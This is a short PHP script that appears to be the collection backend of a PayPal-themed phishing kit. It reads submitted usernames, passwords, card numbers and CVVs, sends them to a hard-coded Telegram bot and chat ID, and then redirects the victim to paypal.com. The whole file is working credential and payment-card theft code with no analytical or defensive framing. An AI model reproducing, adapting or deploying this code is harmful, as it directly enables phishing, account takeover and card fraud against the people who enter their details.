```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phase = $_POST['phase'];
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $card = $_POST['card'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $data = "Phase: $phase | Username: $username | Password: $password | Card: $card | CVV: $cvv";
    
    $chat_id = "7910220440";
    $bot_token = "8289329244:AAGT8spliDd5xl3Pc7c7Ptl1X9j1EQKJgno";
    $message = urlencode($data);
    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$message";
    file_get_contents($url);
    
    header("Location: https://www.paypal.com");
}
?>
```
